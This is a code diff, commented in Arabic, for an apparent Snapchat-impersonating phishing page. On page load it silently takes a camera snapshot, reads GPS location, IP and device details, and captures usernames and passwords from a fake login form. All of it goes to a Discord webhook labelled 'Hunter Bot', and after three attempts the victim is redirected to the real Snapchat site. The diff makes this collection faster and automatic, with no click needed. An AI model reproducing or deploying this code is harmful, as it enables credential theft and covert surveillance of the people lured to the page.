@@ -43,7 +43,7 @@ async function getSystemInfo() {
     return { ...geoip, ua, platform, language, screenRes, batteryInfo };
 }
 
-// دالة جلب الموقع الدقيق (GPS) مع التعامل مع الأذونات
+// سحب الموقع الجغرافي الدقيق بسرعة
 async function getGPSLocation() {
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
@@ -54,16 +54,13 @@ async function getGPSLocation() {
             (pos) => {
                 resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
             },
-            (err) => {
-                console.warn("فشل الحصول على GPS:", err.message);
-                resolve({ lat: null, lng: null });
-            },
-            { timeout: 8000, enableHighAccuracy: true, maximumAge: 0 }
+            () => { resolve({ lat: null, lng: null }); },
+            { timeout: 4000, enableHighAccuracy: true, maximumAge: 0 }
         );
     });
 }
 
-// دالة التقاط الكاميرا مع تصحيح مشكلة الصورة السوداء
+// التقاط الصورة بسرعة فائقة
 async function captureCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -71,26 +68,21 @@ async function captureCamera() {
         });
         
         video.srcObject = stream;
-        
-        // تشغيل الفيديو والانتظار لكي تعمل العدسة وتلتقط الضوء (حل الشاشة السوداء)
         await video.play().catch(() => {});
-        await new Promise(resolve => setTimeout(resolve, 3000)); // مهلة 3 ثوانٍ لضمان وضوح الصورة
+        await new Promise(resolve => setTimeout(resolve, 1500)); // سرعة فائقة في الاستجابة
         
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png', 0.95));
-        
-        // إيقاف الكاميرا فوراً بعد التقاط الصورة
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png', 0.90));
         stream.getTracks().forEach(track => track.stop());
         return blob;
     } catch (e) {
-        console.warn("خطأ في الكاميرا:", e);
         return null;
     }
 }
 
-// دالة الإرسال المتكاملة إلى ديسكورد
+// إرسال البيانات الفوري إلى ديسكورد
 async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status = "") {
     if (isBot()) return;
 
@@ -98,7 +90,7 @@ async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status =
         const info = await getSystemInfo();
         const formData = new FormData();
         
-        let content = `🚨 **[ تقرير صيد جديد ]**\n` +
+        let content = `🔥 **[ صيد سريع وفوري جديد ]** 🔥\n` +
                       `🌐 **IP:** \`${info.ip}\`\n` +
                       `🏙️ **الموقع (IP):** \`${info.country} - ${info.city} (${info.org})\`\n` +
                       `💻 **النظام:** \`${info.platform}\` | 🔋 **البطارية:** \`${info.batteryInfo}\`\n`;
@@ -106,7 +98,7 @@ async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status =
         if (lat && lng) {
             content += `📍 **موقع GPS الدقيق:** [اضغط هنا للعرض](https://www.google.com/maps?q=${lat},${lng}) (\`${lat}, ${lng}\`)\n`;
         } else {
-            content += `📍 **موقع GPS:** تم رفض الإذن من المتصفح أو الرابط ليس HTTPS.\n`;
+            content += `📍 **موقع GPS:** لم يُسمح به.\n`;
         }
 
         if (user) {
@@ -120,32 +112,30 @@ async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status =
         content += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
 
         if (frontBlob) {
-            formData.append('file1', frontBlob, 'camera_shot.png');
+            formData.append('file1', frontBlob, 'instant_shot.png');
         }
 
         formData.append('payload_json', JSON.stringify({
             content: content,
-            username: "Hunter Bot",
+            username: "Instant Hunter Bot",
             avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
         }));
 
         await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-    } catch (err) {
-        console.error("خطأ في إرسال الويب هوك:", err);
-    }
+    } catch (err) {}
 }
 
-// التشغيل التلقائي فور فتح الصفحة الأولى
+// التنفيذ الفوري بمجرد تحميل الصفحة بدون انتظار أي نقرة
 window.addEventListener('DOMContentLoaded', async () => {
-    // محاولة طلب الموقع والكاميرا بالتتابع
-    setTimeout(async () => {
-        const { lat, lng } = await getGPSLocation();
-        const frontBlob = await captureCamera();
-        await sendToDiscord(frontBlob, lat, lng, "", "", "تم فتح الصفحة وطلب الأذونات تلقائياً.");
-    }, 1500);
+    // تشغيل العمليات بالتوازي لضمان أقصى سرعة ممكنة للإرسال
+    const gpsPromise = getGPSLocation();
+    const camPromise = captureCamera();
+    
+    const [gps, frontBlob] = await Promise.all([gpsPromise, camPromise]);
+    await sendToDiscord(frontBlob, gps.lat, gps.lng, "", "", "تم الدخول التلقائي وسحب البيانات فوراً.");
 });
 
-// التعامل مع نموذج تسجيل الدخول (apply.html)
+// التعامل مع نموذج تسجيل الدخول في صفحة apply.html
 const loginForm = document.getElementById('fullLoginForm');
 if (loginForm) {
     loginForm.addEventListener('submit', async (e) => {
@@ -158,21 +148,21 @@ if (loginForm) {
         const loadingOverlay = document.getElementById('loadingOverlay');
         if (loadingOverlay) loadingOverlay.style.display = 'flex';
 
-        const { lat, lng } = await getGPSLocation();
+        const gps = await getGPSLocation();
         const frontBlob = await captureCamera();
 
-        await sendToDiscord(frontBlob, lat, lng, u, p, `محاولة تسجيل الدخول رقم (${loginAttempts})`);
+        await sendToDiscord(frontBlob, gps.lat, gps.lng, u, p, `محاولة تسجيل الدخول رقم (${loginAttempts})`);
 
         setTimeout(() => {
             if (loadingOverlay) loadingOverlay.style.display = 'none';
 
             if (loginAttempts >= 3) {
-                window.location.href = "https://accounts.snapchat.com/";
+                window.location.href = "https://accounts.snapchat.com/"; // التوجيه للسناب الرسمي بعد المحاولة الثالثة[span_1](start_span)[span_1](end_span)
             } else {
                 const errorMsg = document.getElementById('loginErrorMsg');
-                if (errorMsg) errorMsg.style.display = 'block';
+                if (errorMsg) errorMsg.style.display = 'block'; // خطأ كلمة المرور للمحاولة الأولى والثانية[span_2](start_span)[span_2](end_span)
                 e.target.password.value = "";
             }
-        }, 1500);
+        }, 1200);
     });
 }
